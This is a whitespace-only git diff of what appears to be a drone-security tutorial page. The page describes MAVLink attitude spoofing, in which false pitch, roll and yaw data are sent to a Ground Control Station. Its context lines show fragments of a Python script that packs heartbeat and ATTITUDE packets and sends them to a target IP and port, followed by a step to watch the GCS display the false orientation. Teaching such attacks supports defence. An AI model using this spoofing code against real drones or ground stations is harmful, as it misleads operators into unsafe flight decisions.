@@ -10,8 +10,8 @@ breadcrumb:
 sections:
   - title: Description
     content: |
-      Attitude spoofing involves sending false attitude data (pitch, roll, yaw) to the Ground Control Station 
-      (GCS) to mislead it about the drone's actual orientation and movements. This can cause the operator to 
+      Attitude spoofing involves sending false attitude data (pitch, roll, yaw) to the Ground Control Station
+      (GCS) to mislead it about the drone's actual orientation and movements. This can cause the operator to
       make incorrect decisions based on the spoofed data.
 
   - title: Resources
@@ -56,7 +56,7 @@ sections:
                   custom_mode=3,  # Custom mode to indicate flying (ArduCopter: GUIDED mode)
                   system_status=mavutil.mavlink.MAV_STATE_ACTIVE
               )
-              
+
               return heartbeat.pack(mav)
 
           def create_attitude():
@@ -108,7 +108,7 @@ sections:
 
                   send_mavlink_packet(heartbeat_packet, target_ip, target_port)
                   send_mavlink_packet(attitude_packet, target_ip, target_port)
-                  
+
                   print(f"Sent heartbeat and ATTITUDE packets to {target_ip}:{target_port}")
 
           ```
@@ -123,4 +123,3 @@ sections:
       - title: Step 4. Monitor the Effects
         description: |
           Observe the GCS to see the spoofed attitude data being displayed. The drone's orientation (pitch, roll, yaw) will appear different from its actual state.
-
